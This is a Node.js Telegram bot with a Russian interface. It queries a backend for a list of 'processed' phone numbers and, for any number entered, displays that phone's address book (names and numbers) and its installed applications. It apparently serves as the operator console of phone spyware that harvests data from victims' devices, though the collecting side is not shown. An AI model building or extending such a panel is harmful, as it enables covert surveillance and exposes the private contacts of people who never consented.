const TelegramBot = require('node-telegram-bot-api');
require('dotenv').config();
const token = process.env.TOKEN;
const bot = new TelegramBot(token, { polling: true });
const server = require('./requests/Server')
const main_keyboard = {
    reply_markup: {
        keyboard: [
            [{ text: 'Просмотреть отработанные номера' }, { text: 'Инфа по номеру' }],
        ],
        resize_keyboard: true
    }
};
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, 'Привет', main_keyboard);
});

bot.onText(/Просмотреть отработанные номера/, async (msg) => {
    const chatId = msg.chat.id;
    const options = {
        reply_markup: {
            remove_keyboard: false
        }
    };
    const users = await server.getUsers()
    const string_chat = []
    users.forEach(element => {
        string_chat.push(`Телефон:${element.ID}`)
    });
    bot.sendMessage(chatId, `${string_chat}`, options)
});
bot.onText(/Инфа по номеру/, async (msg) => {
    const chatId = msg.chat.id;
    const options = {
        reply_markup: {
            remove_keyboard: false
        }
    };
    bot.sendMessage(chatId, 'Введите номер:', options)
        .then(() => {
            bot.once('message', async (msg) => {
                const phoneNumber = msg.text;
                const userdataByPhone = await server.getUserData(phoneNumber.replace(/^\+/, ''))
                const string_chat_contacts = userdataByPhone.userContacts.map(element => {
                    const name = `Имя: ${element.givenName}`;
                    const phones = `Номера: ${element.phoneNumbers.map(phone => phone.number).join(', ')}`;
                    return `Телефонная книга\n${name}\n${phones}`;
                });
                const string_chat_apps = userdataByPhone.userApps.map(element => {
                    const label = `Название: ${element.label}`;
                    const packageName = `Название пакета: ${element.packageName}`;
                    return `Приложения\n${label}\n${packageName}`;
                });
                const string_chat = string_chat_contacts.concat(string_chat_apps).join('\n\n');
                bot.sendMessage(chatId, `${string_chat}`, options);
            });
        });
});
